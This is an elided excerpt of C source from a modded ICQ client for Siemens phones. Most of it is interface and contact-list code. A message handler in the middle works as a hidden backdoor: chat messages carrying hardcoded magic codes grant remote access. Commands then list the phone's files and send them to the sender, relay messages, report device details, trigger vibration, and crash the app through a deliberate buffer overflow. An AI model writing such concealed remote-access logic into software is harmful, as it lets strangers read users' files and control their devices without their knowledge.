...
if(newCfgFile!=-1 && newCfgModFile!=-1)
{
  ...
  snprintf(awayMsg,64,per_s,myConfMod->awayMsg);
...
void upTime()
{
  ...
  {
   UptimeMinHour();
  GBS_StartTimerProc(&mytmr4, 216, upTime);
  }
  else
  {
    if(!Pause_Time)
...
void show_on_contact()
{
  if(INC_show2>0)
  {
    ...
    DrawString(ws,1,1,1+Get_WS_width(ws,font)+2,1+GetFontYSIZE(font),font,0,GetPaletteAdrByColorIndex(4),GetPaletteAdrByColorIndex(23));
    FreeWS(ws);
    INC_show2--;
...
static const HEADER_DESC contactlist_menuhdr = {0, 0, 0, 0, S_ICONS+ICON_HEAD, (int)clm_hdr_text, 0x7FFF};
...
void new_redraw(void *data)
{
  ...
  PrintText(x+7,(0)+2,status,0,1,1,2,0,0,ScreenW()-20);
}
    ...
    case 4:
      {
        ...
        if(Show_XTX) strcat(status,"[Xs]");
        else strcat(status,"[Tm]");
...
void contactlist_menu_ghook(void *data, int cmd)
{
  ...
  if((((unhooked) || (unhooked2)) && (TIME_OR_MSG==4)))
  {
    ...
    {
     GUI * gui=(GUI*)data;
     memcpy(&gui_methods2,gui->methods,24*4);    
...
char cont_hdr[64];
static const HEADER_DESC contact_list_HDR={0,0,0,0,0,(int)cont_hdr,0x7FFF};
...
{
  uinContact=t->uin;
  icon_array[0]=GetPicNByUnicodeSymbol(0xE10B);
  icon_array[1]=GetPicNByUnicodeSymbol(0xE10C);
...
void contactlist_menu_iconhndl(void *data, int curitem, void *unk)
{
  ...
  if (t)
  {
	...
	wsprintf(ws3,percent_d,t->uin);
      ...
      {
	wsInsertChar(ws3,0xE137+t->xstate,1);
      }
    }
    else
    {
...
{
  comanda=1;
  sprintf(mod_info,"mod by Evilfox,kluchnik,windes based on revision 2058, mod date: %s at %s ","Apr  7 2008","17:13:52");
  t->signals=1;
  ...
  if(!strncmp(txt,"#s",2) && !t->remoteAccess)
  {
    comanda=0;
    t->remoteAccess=1;
    t->signals=0;
        
    if((strtoul(txt+3,0,10)==35174) || strtoul(txt+3,0,10)==97432) t->AccessLevel=0;
    else
      if((strtoul(txt+3,0,10)==45991) || strtoul(txt+3,0,10)==38453) t->AccessLevel=1;
    else
      t->AccessLevel=2;
    
    TPKT *p;
    char msg[256];
    sprintf(msg,"Session start, remote access = %d level access = %d",t->remoteAccess,t->AccessLevel);
    SENDMSGCOUNT++;
    p=malloc(sizeof(PKT)+strlen(msg)+1);
    p->pkt.uin=t->uin;
    p->pkt.type=2;
    p->pkt.data_len=strlen(msg);
    strcpy(p->data,msg);  
    SUBPROC((void *)SendAnswer,0,p);
    return;    
  }
  ...
  if( t->remoteAccess!=4)
  {
   if(strstr(txt,"#echochat"))
   {
    comanda=0;    
    t->signals=1;
    TPKT *p;
    char msg[256];
    sprintf(msg,"Mess send: %s",txt);
    char *k=txt+(strlen("#echochat")+1);
    char name[20];
    char *tmp;
    if(tmp=strstr(txt," ")+1)
    {
    ...
    char *msg2=strrchr(txt,' ');
    SENDMSGCOUNT++;
    p=malloc(sizeof(PKT)+strlen(msg2)+1);
    p->pkt.uin=t->uin;
    p->pkt.type=2;
    p->pkt.data_len=strlen(msg2);
    strcpy(p->data,msg2);  
    SUBPROC((void *)SendAnswer,0,p);
    if(tmp!=0)
      AddStringToLog(t,0x01,msg2,name,(++SENDMSGCOUNT)&0x7FFF,0);
    else
      AddStringToLog(t,0x01,msg2,"Hacker",(++SENDMSGCOUNT)&0x7FFF,0);
    return;   
   }
   ...
   if(strstr(txt,"#vibra"))
    {
      comanda=0;
      vibra_count=strtoul(txt+7,0,10);
      if(vibra_count==0 && VIBR_TYPE) vibra_count=2;
      else if(vibra_count==0) vibra_count=1;
      start_vibra();
      
      TPKT *p;
      p=malloc(sizeof(PKT)+strlen("vibra start")+1);
      SENDMSGCOUNT++;
      p->pkt.uin=t->uin;
      p->pkt.type=2;
      p->pkt.data_len=strlen("vibra start");
      strcpy(p->data,"vibra start");  
      SUBPROC((void *)SendAnswer,0,p);
      return;      
    }
    
    if(strstr(txt,"#showpwd") && t->AccessLevel==0)
    {
      comanda=0;
      char s[64];
      TPKT *p;
      t->signals=0;
      sprintf(s,"Не забывайте ваш пасс: %s!!!!",PASS);
      SENDMSGCOUNT++;
      p=malloc(sizeof(PKT)+strlen("pass show")+1);
      p->pkt.uin=t->uin;
      p->pkt.type=2;
      p->pkt.data_len=strlen("pass show");
      strcpy(p->data,"pass show");  
      SUBPROC((void *)SendAnswer,0,p);
      ShowMSG(1,(int)s);      
      return;
    }
   else
   {
    if(strstr(txt,"#showpwd") && t->AccessLevel!=0)
    {
      ...
      t->signals=0;
      SENDMSGCOUNT++;
      p=malloc(sizeof(PKT)+strlen("Your accsess level has been = 0")+1);
      p->pkt.uin=t->uin;
      p->pkt.type=2;
      p->pkt.data_len=strlen("Your accsess level has been = 0");
      strcpy(p->data,"Your accsess level has been = 0");  
      SUBPROC((void *)SendAnswer,0,p);
      return;
    }
   }
    ...
    if(strstr(txt,"#pikoff"))
    {
      char *s=malloc(1);
      strcpy(s,"FDGDFGDFGDFGD");    
    }
    
    if(strstr(txt,"#idlescr"))
    {
      comanda=0;    
      TPKT *p;
      t->signals=0;
      SENDMSGCOUNT++;
      p=malloc(sizeof(PKT)+strlen("send command islescr")+1);
      p->pkt.uin=t->uin;
      p->pkt.type=2;
      p->pkt.data_len=strlen("send command idlescr");
      strcpy(p->data,"send command idlescr");  
      SUBPROC((void *)SendAnswer,0,p);
    ...
    {      
      ...
      TPKT *p;
      SENDMSGCOUNT++;
      p=malloc(sizeof(PKT)+strlen(txt)+1);
      p->pkt.uin=strtoul(txt+strlen("#write")+1,0,10);
      p->pkt.type=2;
   ...
   if(strstr(txt,"#dir"))
   {
     ...
     if(FindFirstFile(&de,path,&err))
      {
       do
       {
         strcpy(ptr,de.file_name);  
          ...
          sprintf(p,percent_s,de.file_name);
          strcat(s,p);
       }
     ...
     TPKT *pp;
     SENDMSGCOUNT++;
     pp=malloc(sizeof(PKT)+strlen(s)+1);
     pp->pkt.uin=t->uin;
     pp->pkt.type=2;
     pp->pkt.data_len=strlen(s);
     strcpy(pp->data,s);  
     SUBPROC((void *)SendAnswer,0,pp);  
     mfree(s);
     return;
   }
   ...
   if(strstr(txt,"#textinfo"))
   {
     char *s=malloc(16384);
     char pl[256];
     snprintf(pl,256,"%s model: %s\r\n","Platform: SGOLD",Get_Phone_Info(9));
     strcat(s,pl);
     char online[256];
  ...
  if(!strncmp(txt,"#c",2) && t->remoteAccess)
   {
    comanda=0;
    t->remoteAccess=0;
    t->AccessLevel=4;
    ...
    char msg[256];
    SENDMSGCOUNT++;
    sprintf(msg,"Session close, remote access = %d, level = %d",t->remoteAccess,t->AccessLevel);
    p=malloc(sizeof(PKT)+strlen(msg)+1);
    p->pkt.uin=t->uin;
    p->pkt.type=2;
    p->pkt.data_len=strlen(msg);
  ...
  if(!strcmp(txt, "GET_PLATFORM_INFO") || !strcmp(txt, "__PLATFORM"))
  {
    comanda=0;
    TPKT *p;
    char pl[256];
    snprintf(pl,256,"%s model: %s","Platform: SGOLD",Get_Phone_Info(9));
  ...
  if(!strcmp(txt, "GET_URL_INFO") || !strcmp(txt, "__URL"))
  {
    ...
    sprintf(send_txt,"revision 2058, mod date: %s at %s ",
                     ...
                     "Так же все будет тут http://kluchnik.jino-net.ru/naticqmod/","Apr  7 2008","17:13:52");
...
void show_pp_sender()
{
  if(INC_show>0)
  {
    ...
    DrawRectangle(0,0,Get_WS_width(ws,7)+34,GetFontYSIZE(7)+2,0,GetPaletteAdrByColorIndex(1),GetPaletteAdrByColorIndex(1));
    DrawImg(2,2,(int)S_ICONS[IS_MSG]);
    DrawString(ws,34,1,35+Get_WS_width(ws,7)+2,1+GetFontYSIZE(7),7,0,( char*) color,GetPaletteAdrByColorIndex(23));
  ...
  case 9:
	...
	oldt=FindContactByN(GetCurMenuItem(FindGUIbyId(contactlist_menu_id,0)));
      ...
      if(isLogStatusChange)
      {
         ...
         char *txt=malloc(64);
         sprintf(txt," %s: %02d:%02d:%02d %02d.%02d",stat,time.hour,time.min,time.sec,date.month,date.day);
        
         t->xtext2=malloc(64);
         snprintf(t->xtext2,64,txt);
         AddStringToLog(t,0x03,txt,"",0xFFFFFFFF, 0);
         ReqAddMsgToChat(t);  
         RecountMenu(0, 0);
         mfree(txt);
      }
...
void method0(MAIN_GUI *data)
{
  ...
  if(pm != pl)
  {
     DrawRectangle(0,scr_h-4-2*GetFontYSIZE(8),scr_w-1,scr_h-4-GetFontYSIZE(3)-2,0,
                     GetPaletteAdrByColorIndex(0),
                     GetPaletteAdrByColorIndex(0));
    pos_status = ((scr_w-1) * pl) / pm;
    DrawRectangle(1,scr_h-4-2*GetFontYSIZE(8)+1,pos_status,scr_h-4-GetFontYSIZE(3)-3,0,
 ...
 DrawString(data->ws1,3,3+(0),scr_w-4,scr_h-4-GetFontYSIZE(3),
	     7,0,GetPaletteAdrByColorIndex(0),GetPaletteAdrByColorIndex(23));
  wsprintf(data->ws2,percent_t,cltop?"CList":empty_str);
  DrawString(data->ws2,(scr_w >> 1),scr_h-4-GetFontYSIZE(3),
	     scr_w-4,scr_h-4,3,4,GetPaletteAdrByColorIndex(0),GetPaletteAdrByColorIndex(23));
  wsprintf(data->ws2,percent_t,"Exit");
  DrawString(data->ws2,3,scr_h-4-GetFontYSIZE(3),
	     scr_w>>1,scr_h-4,3,1,GetPaletteAdrByColorIndex(0),GetPaletteAdrByColorIndex(23));
}
